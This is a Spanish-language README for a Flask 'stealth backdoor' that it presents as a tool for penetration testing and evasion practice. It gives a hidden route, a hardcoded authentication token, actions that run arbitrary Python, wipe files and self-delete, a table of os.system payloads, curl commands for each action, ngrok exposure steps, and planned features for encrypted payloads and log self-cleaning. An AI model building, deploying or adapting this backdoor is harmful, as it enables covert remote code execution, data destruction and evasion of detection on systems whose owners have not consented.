# 🕵️ Stealth Flask Backdoor


Este microservidor Flask simula una puerta trasera para ejecutar pruebas de penetración y técnicas de evasión en entornos controlados.

## 🚀 Funcionalidades

- ✅ Ruta oculta: `POST /.well-known/assets`
- 🔐 Requiere header de autenticación:  
  `X-Auth-Token: U3VwZXJTZWNyZXQ=`  ← base64("SuperSecret")
- 🎯 Acciones disponibles vía parámetro `act`:
  - `act=borrar` → borra todos los archivos en `./books`
  - `act=ejecutar` → ejecuta código Python arbitrario
  - `act=autodestruir` → borra el script `backdoor.py`
- 📁 Genera un registro oculto en `.syslog` con la IP y actividad

---

## 🧪Payloads útiles (acción: `ejecutar`)

| Payload                                             | Descripción                             |
|-----------------------------------------------------|-----------------------------------------|
| `print("Hola mundo")`                              | Imprime en consola del servidor         |
| `open("flag.txt", "w").write("✅")`                 | Escribe un archivo de texto             |
| `__import__('os').system('ls')`                     | Ejecuta un comando del sistema          |
| `__import__('socket').gethostbyname(...)`           | Obtener la IP del servidor              |
| `__import__('shutil').copy("f", "dest")`            | Copiar archivos                         |


🕵️ Log de Actividad
Todos los accesos exitosos se registran en el archivo .syslog, incluyendo:

log
Copiar
Editar
Registro: 192.168.0.45
Registro: acción ejecutada


🌐 Exposición remota
¿No estás en red pública? Usa ngrok:

bash
Copiar
Editar
ngrok http 5000
Y luego accede desde cualquier parte del mundo vía HTTPS.


---
## 📦 Ejecución

📡 Activación remota (desde otra máquina)
Requisitos:
Agregar el header:
X-Auth-Token: U3VwZXJTZWNyZXQ=
🔥 Ejecutar código Python:
```bash
curl -X POST "http://<host>:5000/.well-known/assets?act=ejecutar" \
  -H "X-Auth-Token: U3VwZXJTZWNyZXQ=" \
  --data 'open("flag.txt", "w").write("Pwned!")'
```
🧨 Borrar archivos:
```bash
curl -X POST "http://<host>:5000/.well-known/assets?act=borrar" \
  -H "X-Auth-Token: U3VwZXJTZWNyZXQ="
```
🫥 Autodestrucción:
```bash
curl -X POST "http://<host>:5000/.well-known/assets?act=autodestruir" \
  -H "X-Auth-Token: U3VwZXJTZWNyZXQ="
```
```bash
pip install -r requirements.txt
python backdoor.py
```
Accede desde otro sistema:

```bash
curl -X POST "http://<host>:5000/.well-known/assets?act=script" \
  -H "X-Auth-Token: U3VwZXJTZWNyZXQ=" \
  --data 'print("Backdoor activada")'
```

---

TODO / Mejoras futuras
 Añadir cifrado AES a los scripts

 Backdoor activada por Redis

 Modos silenciosos de respuesta (stealth logs, autolimpieza)
